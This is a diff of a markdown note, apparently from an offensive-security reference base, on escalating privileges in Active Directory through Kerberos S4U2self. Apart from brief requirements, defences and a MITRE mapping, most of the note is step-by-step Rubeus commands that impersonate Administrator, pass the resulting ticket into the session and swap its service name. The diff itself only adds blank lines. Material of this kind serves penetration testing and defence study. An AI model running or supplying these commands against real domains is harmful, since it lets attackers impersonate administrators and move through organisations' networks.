@@ -41,11 +41,15 @@ To execute this attack, the attacker needs to have already obtained the user's T
 
 The business value of this attack is that it allows an attacker to gain access to sensitive data and systems within the organization, potentially causing significant harm.
 
+ 
+
 ## Requirements
 
 1. Access to the user's TGT
 
 1. Rubeus tool
+
+ 
 
 ## Defense
 
@@ -54,6 +58,8 @@ The business value of this attack is that it allows an attacker to gain access t
 1. Implementing proper network segmentation can limit the attacker's ability to move laterally within the network.
 
 1. Monitoring for anomalous activity such as the generation of S4U2self Service Tickets can help detect and respond to this attack.
+
+ 
 
 ## Objectives
 
@@ -65,6 +71,8 @@ The business value of this attack is that it allows an attacker to gain access t
 
 1. Potentially escalate privileges
 
+ 
+
 # Instructions
 
 1. To obtain a Service Ticket as a domain admin for the machine, run the following commands:
@@ -75,9 +83,17 @@ Rubeus.exe ptt /ticket:"base64ticket"
 3. Use the obtained Service Ticket to make a S4U2self request again:
 Rubeus.exe s4u /self /nowrap /impersonateuser:"Administrator" /altservice:"cifs/srv001" /ticket:"base64ticket" /ptt
 
+ 
+
+
+
 **Code**: [[Rubeus.exe s4u /self /nowrap /impersonateuser:"Adm]]
 
+
+
 > The provided commands demonstrate how to use Rubeus to obtain a Service Ticket as domain admin for the machine. The first command makes a S4U2self request using the provided TGT to obtain a Service Ticket for the specified service. The obtained ticket is then passed to Rubeus to acquire a Service Ticket. Finally, the obtained Service Ticket is used to make a S4U2self request again to obtain the necessary privileges for the specified service.
+
+
 
 **Command** ([[Rubeus s4u impersonation with base64ticket]]):
 
@@ -85,11 +101,19 @@ Rubeus.exe s4u /self /nowrap /impersonateuser:"Administrator" /altservice:"cifs/
 Rubeus.exe s4u /self /nowrap /impersonateuser:"Administrator" /altservice:"cifs/srv001.domain.local" /ticket:"base64ticket"
 ```
 
+
+
+
+
 **Command** ([[Rubeus ptt with base64ticket]]):
 
 ```bash
 Rubeus.exe ptt /ticket:"base64ticket"
 ```
+
+
+
+
 
 **Command** ([[Rubeus s4u impersonation with base64ticket and ptt]]):
 
@@ -97,13 +121,23 @@ Rubeus.exe ptt /ticket:"base64ticket"
 Rubeus.exe s4u /self /nowrap /impersonateuser:"Administrator" /altservice:"cifs/srv001" /ticket:"base64ticket" /ptt
 ```
 
+
+
 2. To generate an S4U2Self ticket using Rubeus, run the following commands:
 1. Rubeus.exe s4u /user:<computerAccount> /msdsspn:cifs/<computerDNS> /impersonateuser:<localAdmin> /ticket:<TGT> /nowrap
 2. Rubeus.exe tgssub /ticket:<ticket> /altservice:cifs/<ServerDNSName> /ptt
 
+ 
+
+
+
 **Code**: [[# The Rubeus execution will fail when trying the S]]
 
+
+
 > The above commands use Rubeus to generate a service for user (S4U) ticket for the current user's computer account. The S4U2Self ticket allows the user to impersonate any user to themselves. The first command generates the ticket and the second command substitutes the service name in the ticket with the specified alternate service name, and then injects the ticket into the current logon session (Pass-the-Ticket).
+
+
 
 **Command** ([[Execute Rubeus s4u command]]):
 
@@ -111,11 +145,17 @@ Rubeus.exe s4u /self /nowrap /impersonateuser:"Administrator" /altservice:"cifs/
 Rubeus.exe s4u /user:${computerAccount} /msdsspn:cifs/${computerDNS} /impersonateuser:${localAdmin} /ticket:${TGT} /nowrap
 ```
 
+
+
+
+
 **Command** ([[Modify TGS ciphered data using Rubeus tgssub command]]):
 
 ```bash
 Rubeus.exe tgssub /ticket:${ticket} /altservice:cifs/${ServerDNSName} /ptt
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -145,3 +185,5 @@ Rubeus.exe tgssub /ticket:${ticket} /altservice:cifs/${ServerDNSName} /ptt
 - [[Active Directory Attacks]]
 - [[Kerberos Service for User Extension]]
 - [[S4U2self - Privilege Escalation]]
+
+
